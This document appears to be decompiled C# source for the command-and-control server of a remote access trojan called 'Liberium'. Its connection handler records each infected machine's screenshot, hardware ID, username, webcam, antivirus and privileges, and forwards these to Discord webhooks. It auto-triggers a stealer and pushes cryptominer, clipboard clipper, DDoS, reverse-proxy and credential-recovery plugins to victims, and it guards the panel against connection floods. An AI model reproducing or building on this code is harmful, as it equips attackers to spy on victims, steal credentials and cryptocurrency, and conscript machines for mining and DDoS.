using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using cGeoIp;
using Leb128;
using MaterialSkin;
using Server.Connectings;
using Server.Forms;
using Server.Helper;
using Server.Helper.Bulider;
using Server.Helper.Tasks;

namespace Server.Messages;

internal class HandlerConnect
{
	private class ConnectAttempt
	{
		public DateTime Timestamp { get; set; }

		public string Hwid { get; set; }
	}

	private static readonly object _lockObject = new object();

	private static readonly Dictionary<string, List<ConnectAttempt>> _connectHistory = new Dictionary<string, List<ConnectAttempt>>();

	private static readonly Dictionary<string, DateTime> _tempBannedIPs = new Dictionary<string, DateTime>();

	private static readonly Dictionary<string, List<DateTime>> _connectMessageHistory = new Dictionary<string, List<DateTime>>();

	private const int _maxConnectionAttempts = 30;

	private const int _maxConnectsPerIPPerWindow = 150;

	private const int _maxDifferentHwidsPerIP = 50;

	private const int _maxConnectsSameHwidPerWindow = 15;

	private const int _maxConnectMessagesPerWindow = 100;

	private static readonly TimeSpan _connectWindow = TimeSpan.FromSeconds(10.0);

	private static readonly TimeSpan _connectMessageWindow = TimeSpan.FromSeconds(5.0);

	private static readonly TimeSpan _tempBanDuration = TimeSpan.FromMinutes(1.0);

	public static cGeoMain cGeoMain = new cGeoMain();

	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 4)
		{
			client.Disconnect();
			return;
		}
		string clientIP = client.IP;
		string hwid = SecurityHelper.SanitizeHwid((string)objects[3]);
		if (!IsLocalhost(clientIP))
		{
			if (IsIPBlocked(clientIP))
			{
				client.Disconnect();
				return;
			}
			if (CheckConnectMessageSpam(clientIP))
			{
				client.Disconnect();
				return;
			}
			if (CheckSpamPatterns(clientIP, hwid, client))
			{
				client.Disconnect();
				return;
			}
		}
		string externalIP = ((objects.Length > 14) ? ((string)objects[14]) : client.IP);
		if (!string.IsNullOrEmpty(externalIP) && IPAddress.TryParse(externalIP, out var _))
		{
			client.RealIP = externalIP;
		}
		else
		{
			client.RealIP = client.IP;
		}
		bool isNewUser = !File.Exists("Users\\" + hwid + "\\Information.txt");
		DataGridViewRow RowClient = new DataGridViewRow();
		RowClient.Tag = client;
		RowClient.Height = Program.form.HeightColumn();
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		RowClient.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		RowClient.DefaultCellStyle.BackColor = (isDark ? Color.FromArgb(40, 40, 40) : Color.White);
		RowClient.DefaultCellStyle.SelectionForeColor = Color.White;
		RowClient.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		client.Tag = RowClient;
		client.Hwid = hwid;
		client.UserMachine = (string)objects[4];
		using (MemoryStream memoryStream = new MemoryStream((byte[])objects[1]))
		{
			RowClient.Cells.Add(new DataGridViewImageCell
			{
				Value = new Bitmap(memoryStream),
				ImageLayout = DataGridViewImageCellLayout.Stretch
			});
			try
			{
				string userDir = "Users\\" + hwid;
				if (!Directory.Exists(userDir))
				{
					Directory.CreateDirectory(userDir);
				}
				File.WriteAllBytes(userDir + "\\screenshot.png", (byte[])objects[1]);
			}
			catch
			{
			}
		}
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = client.RealIP
		});
		string text = "Unknown";
		string text2 = "";
		try
		{
			string[] array = cGeoMain.GetIpInf(client.RealIP).Split(':');
			text = ((array.Length > 1) ? array[1] : "Unknown");
			if (array.Length > 2)
			{
				text2 = array[2];
			}
		}
		catch
		{
		}
		Image flagImage = null;
		try
		{
			flagImage = FlagHelper.GetFlagImage(text2, text);
		}
		catch
		{
		}
		if (flagImage == null)
		{
			flagImage = FlagHelper.GetUnknownFlagImageSafe();
		}
		RowClient.Cells.Add(new CenteredFlagImageCell
		{
			Value = flagImage
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = text
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[2]
		});
		DataGridViewCellCollection cells = RowClient.Cells;
		DataGridViewTextBoxCell dataGridViewTextBoxCell = new DataGridViewTextBoxCell();
		object obj4 = objects[3];
		string noteFilePath = "Users\\" + obj4?.ToString() + "\\Note.txt";
		object value;
		if (Program.form.settings == null || !Program.form.settings.AutoNote || string.IsNullOrEmpty(text2))
		{
			value = (File.Exists(noteFilePath) ? File.ReadAllText("Users\\" + objects[3]?.ToString() + "\\Note.txt") : "");
		}
		else
		{
			value = text2.ToUpper();
			try
			{
				string userDir2 = "Users\\" + obj4;
				if (!Directory.Exists(userDir2))
				{
					Directory.CreateDirectory(userDir2);
				}
				File.WriteAllText(noteFilePath, value.ToString());
			}
			catch
			{
			}
		}
		dataGridViewTextBoxCell.Value = value;
		cells.Add(dataGridViewTextBoxCell);
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[3]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[4]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[5]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[6]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[7]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[8]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[9]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[10]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[11]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[12]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = "0"
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[13]
		});
		try
		{
			string group = (string)objects[2];
			BuildStats.IncrementUsers(group);
			if (Application.OpenForms["FormBulider"] is FormBulider formBulider)
			{
				formBulider.IncrementUsers(group);
			}
		}
		catch
		{
		}
		int clientCount = 1;
		Program.form.GridClients.Invoke((MethodInvoker)delegate
		{
			Program.form.GridClients.Rows.Add(RowClient);
			clientCount = Program.form.GridClients.Rows.Count;
		});
		SoundPlayer.PlayConnectSound(clientCount);
		string username = (string)objects[4];
		string country = text;
		if (Program.form.settings != null && Program.form.settings.Notificator)
		{
			WindowsNotifier.ShowConnectionNotification(client.RealIP, username, country, client.Hwid, isNewUser);
		}
		if (Program.form.settings.AutoStealer)
		{
			AutoTaskMgr.Stealer(client);
		}
		AutoTaskMgr.RunTasks(client);
		if (!isNewUser)
		{
			Methods.AppendLogs("Client " + client.RealIP + " " + client.UserMachine + " " + client.Hwid, "Connect", Color.Green);
			if (Program.form.settings.WebHookConnect && !string.IsNullOrEmpty(Program.form.settings.WebHook))
			{
				try
				{
					string mssgBody = BuildDiscordConnectMessage(client, objects, text, text2, isNewUser: false);
					string[] array2 = Program.form.settings.WebHook.Split(',');
					for (int num = 0; num < array2.Length; num++)
					{
						string wh = array2[num].Trim();
						if (!string.IsNullOrEmpty(wh))
						{
							DiscordWebhook.Send(mssgBody, "Liberium Log", wh);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			if (Program.form.settings.TelegramConnect && !string.IsNullOrEmpty(Program.form.settings.TelegramBotToken) && !string.IsNullOrEmpty(Program.form.settings.TelegramChatID))
			{
				client.IsNewUser = false;
			}
		}
		else
		{
			client.Hwid = hwid;
			client.IsNewUser = true;
			Methods.AppendLogs("Client " + client.RealIP + " " + client.UserMachine + " " + client.Hwid, "New Connect", Color.Green);
			Directory.CreateDirectory("Users\\" + client.Hwid);
			if (Program.form.settings.WebHookNewConnect && !string.IsNullOrEmpty(Program.form.settings.WebHook))
			{
				try
				{
					string mssgBody2 = BuildDiscordConnectMessage(client, objects, text, text2, isNewUser: true);
					string[] array2 = Program.form.settings.WebHook.Split(',');
					for (int num = 0; num < array2.Length; num++)
					{
						string wh2 = array2[num].Trim();
						if (!string.IsNullOrEmpty(wh2))
						{
							DiscordWebhook.Send(mssgBody2, "Liberium Log", wh2);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			if (Program.form.settings.TelegramNewConnect && !string.IsNullOrEmpty(Program.form.settings.TelegramBotToken))
			{
				string.IsNullOrEmpty(Program.form.settings.TelegramChatID);
			}
		}
		List<string> list = new List<string>();
		foreach (DataGridViewCell dataGridViewCell in RowClient.Cells)
		{
			if (dataGridViewCell.Value is string)
			{
				list.Add(dataGridViewCell.OwningColumn.Name.Replace("Column", "") + ": " + (string)dataGridViewCell.Value);
			}
		}
		File.WriteAllText("Users\\" + client.Hwid + "\\Information.txt", string.Join("\n", list.ToArray()));
		if (Program.form.MinerXMR.work)
		{
			string checksum = Methods.GetChecksum("Plugin\\MinerXMR.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum,
				new byte[1]
			});
		}
		if (Program.form.MinerEtc.work)
		{
			string checksum2 = Methods.GetChecksum("Plugin\\MinerEtc.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum2,
				new byte[1]
			});
		}
		if (Program.form.MinerRigel.work)
		{
			string checksumRigel = Methods.GetChecksum("Plugin\\MinerRigel.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksumRigel,
				new byte[1]
			});
		}
		if (Program.form.Clipper.work)
		{
			string checksum3 = Methods.GetChecksum("Plugin\\Clipper.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum3,
				new byte[1]
			});
		}
		if (Program.form.DDos.work)
		{
			string checksum4 = Methods.GetChecksum("Plugin\\DDos.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum4,
				new byte[1]
			});
		}
		if (Program.form.ReverseProxyR.work)
		{
			byte[] array3 = LEB128.Write(new object[2] { "Pack", "ReverseProxyR" });
			string checksum5 = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
			client.Send(new object[3] { "Invoke", checksum5, array3 });
		}
		if (Program.form.ReverseProxyU.work)
		{
			byte[] array4 = LEB128.Write(new object[2] { "Pack", "ReverseProxyU" });
			string checksum6 = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
			client.Send(new object[3] { "Invoke", checksum6, array4 });
		}
		if (Program.form.settings.Notificator)
		{
			string checksumRecovery = Methods.GetChecksum("Plugin\\Recovery.dll");
			if (!string.IsNullOrEmpty(checksumRecovery))
			{
				client.Send(new object[3]
				{
					"Invoke",
					checksumRecovery,
					new byte[1]
				});
			}
		}
	}

	private static string BuildDiscordConnectMessage(Clients client, object[] objects, string countryName, string countryCode, bool isNewUser)
	{
		string ip = client?.RealIP ?? "-";
		string group = ((objects.Length > 2) ? (((string)objects[2]) ?? "-") : "-");
		string hwid = ((objects.Length > 3) ? (((string)objects[3]) ?? "-") : "-");
		string username = ((objects.Length > 4) ? (((string)objects[4]) ?? "-") : "-");
		string camera = ((objects.Length > 5) ? (((string)objects[5]) ?? "-") : "-");
		string cpu = ((objects.Length > 6) ? (((string)objects[6]) ?? "-") : "-");
		string gpu = ((objects.Length > 7) ? (((string)objects[7]) ?? "-") : "-");
		string windows = ((objects.Length > 8) ? (((string)objects[8]) ?? "-") : "-");
		string antivirus = ((objects.Length > 9) ? (((string)objects[9]) ?? "-") : "-");
		string version = ((objects.Length > 10) ? (((string)objects[10]) ?? "-") : "-");
		string timeInstall = ((objects.Length > 11) ? (((string)objects[11]) ?? "-") : "-");
		string privilege = ((objects.Length > 12) ? (((string)objects[12]) ?? "-") : "-");
		string window = ((objects.Length > 13) ? (((string)objects[13]) ?? "-") : "-");
		if (hwid != null && hwid.Length > 40)
		{
			hwid = hwid.Substring(0, 40) + "...";
		}
		if (window != null && window.Length > 80)
		{
			window = window.Substring(0, 80) + "...";
		}
		if (cpu != null && cpu.Length > 50)
		{
			cpu = cpu.Substring(0, 50) + "...";
		}
		if (gpu != null && gpu.Length > 50)
		{
			gpu = gpu.Substring(0, 50) + "...";
		}
		string flag = (string.IsNullOrEmpty(countryCode) ? "" : (" :flag_" + countryCode.ToLower() + ":"));
		string title = (isNewUser ? ":new: **New Connect**" : ":comet: **Reconnect**");
		return title + "\n" + "```" + "IP:        " + ip + "\n" + "Country:   " + countryName + "\n" + "Group:     " + group + "\n" + "Username:  " + username + "\n" + "HWID:      " + hwid + "\n" + "Windows:   " + windows + "\n" + "Version:   " + version + "\n" + "CPU:       " + cpu + "\n" + "GPU:       " + gpu + "\n" + "Camera:    " + camera + "\n" + "AntiVirus: " + antivirus + "\n" + "Privilege: " + privilege + "\n" + "Installed: " + timeInstall + "\n" + "Window:    " + window + "```" + flag;
	}

	private static bool IsLocalhost(string ip)
	{
		if (string.IsNullOrEmpty(ip))
		{
			return false;
		}
		string s = ip.Trim();
		if (!(s == "127.0.0.1") && !(s == "::1") && !s.StartsWith("127.") && !(s == "[::1]"))
		{
			return s.StartsWith("[::1]");
		}
		return true;
	}

	private static bool IsRealClient(string hwid)
	{
		if (string.IsNullOrEmpty(hwid))
		{
			return false;
		}
		try
		{
			return Directory.Exists(Path.Combine("Users", hwid));
		}
		catch
		{
			return false;
		}
	}

	private static bool IsIPBlocked(string ip)
	{
		lock (_lockObject)
		{
			DateTime now = DateTime.UtcNow;
			if (_tempBannedIPs.TryGetValue(ip, out var banUntil))
			{
				if (now < banUntil)
				{
					return true;
				}
				_tempBannedIPs.Remove(ip);
			}
			return false;
		}
	}

	private static bool CheckConnectMessageSpam(string ip)
	{
		lock (_lockObject)
		{
			DateTime now = DateTime.UtcNow;
			if (!_connectMessageHistory.TryGetValue(ip, out var history))
			{
				history = new List<DateTime>();
				_connectMessageHistory[ip] = history;
			}
			history.Add(now);
			history.RemoveAll((DateTime t) => now - t > _connectMessageWindow);
			if (history.Count > 100)
			{
				_tempBannedIPs[ip] = now.Add(_tempBanDuration);
				Methods.AppendLogs("AntiDDoS", $"RCE Attack Blocked! IP {ip} - Connect flood ({history.Count} per {_connectMessageWindow.TotalSeconds} sec)", Color.Red);
				return true;
			}
			return false;
		}
	}

	private static int CountActiveConnections(string ip)
	{
		int count = 0;
		if (Program.form != null)
		{
			Clients[] array = Program.form.ClientsAll();
			foreach (Clients c in array)
			{
				if (c.IP == ip && c.itsConnect && c.Auth)
				{
					count++;
				}
			}
		}
		return count;
	}

	private static void HandleDuplicateSessions(string ip, string hwid, bool isSuspiciousHwid)
	{
		if (string.IsNullOrEmpty(hwid) || isSuspiciousHwid)
		{
			return;
		}
		List<Clients> sameIPClients = new List<Clients>();
		if (Program.form != null)
		{
			Clients[] array = Program.form.ClientsAll();
			foreach (Clients c in array)
			{
				if (c.IP == ip && c.itsConnect && c.Auth)
				{
					sameIPClients.Add(c);
				}
			}
		}
		if (sameIPClients.Count <= 0)
		{
			return;
		}
		List<Clients> duplicateSameHwid = new List<Clients>();
		foreach (Clients c2 in sameIPClients)
		{
			if (!string.IsNullOrEmpty(c2.Hwid) && string.Equals(c2.Hwid, hwid, StringComparison.OrdinalIgnoreCase))
			{
				duplicateSameHwid.Add(c2);
			}
		}
		if (duplicateSameHwid.Count <= 0)
		{
			return;
		}
		foreach (Clients oldClient in duplicateSameHwid)
		{
			try
			{
				oldClient.Disconnect();
			}
			catch
			{
			}
		}
	}

	private static bool DetectSpamPattern(string ip, string hwid, List<ConnectAttempt> history, bool isSuspiciousHwid, bool isRealClient)
	{
		DateTime now = DateTime.UtcNow;
		if (isSuspiciousHwid && history.Count((ConnectAttempt h) => string.Equals(h.Hwid, hwid ?? string.Empty, StringComparison.OrdinalIgnoreCase)) >= 2)
		{
			_tempBannedIPs[ip] = now.Add(_tempBanDuration);
			return true;
		}
		List<string> uniqueHwids = (from h in history
			where !string.IsNullOrEmpty(h.Hwid)
			select h.Hwid).Distinct().ToList();
		int connectionsWithoutHwid = history.Count((ConnectAttempt h) => string.IsNullOrEmpty(h.Hwid));
		int sameHwidCount = 0;
		if (!string.IsNullOrEmpty(hwid))
		{
			sameHwidCount = history.Count((ConnectAttempt h) => string.Equals(h.Hwid, hwid, StringComparison.OrdinalIgnoreCase));
		}
		bool isSpam = false;
		if (uniqueHwids.Count > 50)
		{
			isSpam = true;
		}
		else if (history.Count > 150)
		{
			isSpam = true;
		}
		else if (!string.IsNullOrEmpty(hwid))
		{
			int maxConnects = (isSuspiciousHwid ? 3 : 15);
			if (sameHwidCount > maxConnects)
			{
				isSpam = true;
			}
		}
		else if (connectionsWithoutHwid > 20)
		{
			isSpam = true;
		}
		if (isSpam)
		{
			_tempBannedIPs[ip] = now.Add(_tempBanDuration);
			Methods.AppendLogs("AntiDDoS", $"RCE Attack Blocked! IP {ip} - DDoS detected ({history.Count} packets, {uniqueHwids.Count} HWIDs)", Color.Red);
			return true;
		}
		return false;
	}

	private static bool CheckSpamPatterns(string ip, string hwid, Clients client)
	{
		lock (_lockObject)
		{
			DateTime now = DateTime.UtcNow;
			bool isSuspiciousHwid = !string.IsNullOrEmpty(hwid) && !Regex.IsMatch(hwid, "^[0-9a-fA-F]{32}$");
			int connectedCount = CountActiveConnections(ip);
			bool isRealClient = !string.IsNullOrEmpty(hwid) && IsRealClient(hwid);
			HandleDuplicateSessions(ip, hwid, isSuspiciousHwid);
			if (!_connectHistory.TryGetValue(ip, out var history))
			{
				history = new List<ConnectAttempt>();
				_connectHistory[ip] = history;
			}
			history.Add(new ConnectAttempt
			{
				Timestamp = now,
				Hwid = (hwid ?? string.Empty)
			});
			history.RemoveAll((ConnectAttempt t) => now - t.Timestamp > _connectWindow);
			if (DetectSpamPattern(ip, hwid, history, isSuspiciousHwid, isRealClient))
			{
				return true;
			}
			if (connectedCount >= 30)
			{
				return true;
			}
			return false;
		}
	}
}
